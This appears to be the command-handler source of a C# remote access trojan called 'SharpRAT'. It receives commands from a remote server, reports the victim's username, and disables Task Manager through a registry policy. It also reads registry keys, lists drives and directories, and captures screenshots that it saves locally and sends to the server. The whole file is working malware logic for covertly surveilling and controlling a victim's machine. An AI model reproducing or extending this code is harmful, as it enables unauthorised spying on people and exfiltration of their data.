
using Microsoft.Win32;
using System.Diagnostics;
using System.Text;

namespace Client.Client
{
    public class CommandHandler
    {
        public static bool SendName()
        {
            Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
            return true;
        }

        public static void ParseData(string data)
        {
            string tempString = data.Replace("<EOF>", "");

            if (tempString.StartsWith("<CMD=MSGBOX>"))
            {
                tempString = tempString.Replace("<CMD=MSGBOX>", "");
                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }
            else if (tempString.StartsWith("<PING>"))
            {
                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes(tempString));
            }
            else if (tempString.StartsWith("<SET-TASKMGR>"))
            {
                string value = tempString.Split(">")[1];
                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
            }
            else if (tempString.StartsWith("<GET-REGKEY>"))
            {
                tempString = tempString.Replace("<GET-REGKEY>", "");
                string[] split = tempString.Split("<SPLIT>");
                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
            }
            else if (tempString.StartsWith("<SHUTDOWN-CLIENT>"))
            {
                SocketClient.bShouldRun = false;
                Main.socketClient.GetServerSocket().Disconnect(false);
                Main.socketClient.GetServerSocket().Close();
                Application.Exit();
            }

            if (tempString.StartsWith("<REQUEST-DRIVES>"))
            {
                FileManager.LoadDrives();
            }
            if (tempString.StartsWith("<REQUEST-DIRS>"))
            {
                tempString = tempString.Replace("<REQUEST-DIRS>", "");

                FileManager.LoadDirectories(tempString);
            }
            else if (tempString.StartsWith("<SCREENSHOT>"))
            {
                Debug.WriteLine("received screenshot command");

                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                Graphics memoryGraphics = Graphics.FromImage(bitmap);

                memoryGraphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

                //That's it! Save the image in the directory and this will work like charm.  
                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SharpRAT\screenshot\Screenshot" + "_" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");

                // save it  
                bitmap.Save(fileName);
                MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                byte[] b = ms.ToArray();
                Debug.WriteLine($"{b}");
                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"+ b +"<EOF>"));
                //GetServerSocket().Send(Encoding.ASCII.GetBytes($"{ b}"));
                //GetServerSocket().Send(Encoding.ASCII.GetBytes("<EOF>"));
                ms.Close();
                Debug.WriteLine("sent data back");
            }
        }

    }
}
